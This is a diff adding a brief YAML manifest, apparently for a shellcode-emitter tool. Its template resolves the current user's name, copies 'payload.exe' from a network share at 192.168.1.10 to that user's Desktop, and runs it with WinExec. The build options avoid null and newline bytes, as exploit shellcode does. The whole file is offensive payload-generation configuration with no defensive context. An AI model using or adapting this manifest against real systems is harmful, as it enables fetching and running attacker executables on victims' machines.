@@ -1,0 +1,11 @@
+# MoveFileA to user directory (runtime path via GetUserNameA)
+# IR workflow: GetUserNameA -> build path -> MoveFileA -> WinExec
+#
+# Build:
+#   uv run emitrion emitrion/manifests/move_to_userdir.yaml \
+#       --src "\\\\192.168.1.10\\share\\payload.exe" \
+#       --path-prefix "C:\Users\\" \
+#       --path-suffix "\Desktop\payload.exe" \
+#       --no-assemble --out emitter_out/
+template: ir_move_to_userdir
+badchars: ["00", "0A", "0D"]
